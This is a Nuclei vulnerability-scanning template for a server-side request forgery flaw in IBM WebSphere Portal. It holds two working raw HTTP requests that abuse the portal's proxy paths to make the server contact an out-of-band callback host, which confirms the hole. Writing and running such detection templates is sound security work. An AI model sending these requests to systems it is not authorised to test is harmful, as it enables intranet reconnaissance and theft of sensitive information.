id: websphere-portal-ssrf
info:
  name: Websphere Portal SSRF
  author: ProjectDiscoveryAI
  severity: high
  description: |
    IBM WebSphere Portal consists of middleware, applications (called portlets), and development tools used to build and manage secure portals. It has server-side request forgery vulnerabilities, allowing attackers to detect intranet and obtain sensitive information.
  tags: ssrf
  reference:
    - https://blog.assetnote.io/2021/12/25/advisory-websphere-portal/

variables:
  dnslog: "{{interactsh-url}}"

http:
  - raw:
      - |
        GET /docpicker/internal_proxy/http/{{dnslog}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

  - raw:
      - |
        GET /wps/proxy/http/www.redbooks.ibm.com/Redbooks.nsf/RedbookAbstracts/sg247798.html?Logout&RedirectTo=http://{{dnslog}} HTTP/1.1
        Host: {{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
